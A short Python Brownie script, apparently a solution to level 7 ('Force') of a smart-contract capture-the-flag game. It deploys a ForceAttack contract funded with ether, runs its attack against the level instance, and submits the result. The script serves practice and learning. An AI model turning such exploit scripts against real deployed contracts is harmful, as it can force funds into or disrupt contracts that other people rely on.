from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    ForceAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=7, player=player)

    attack_contract = ForceAttack.deploy({"from": player, "value": Web3.toWei("0.001", "ether")})

    tx = attack_contract.attack(instance_address, {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)
